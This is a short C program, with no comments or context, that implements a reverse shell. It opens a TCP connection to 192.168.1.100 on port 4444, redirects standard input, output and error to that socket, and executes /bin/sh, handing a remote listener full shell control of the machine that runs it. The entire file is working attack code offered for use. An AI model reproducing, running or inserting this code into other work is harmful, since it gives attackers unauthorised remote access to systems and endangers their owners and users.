#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
    int sock;
    struct sockaddr_in serverAddr;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444);
    serverAddr.sin_addr.s_addr = inet_addr("192.168.1.100");

    connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execl("/bin/sh", "sh", NULL);

    return 0;
}
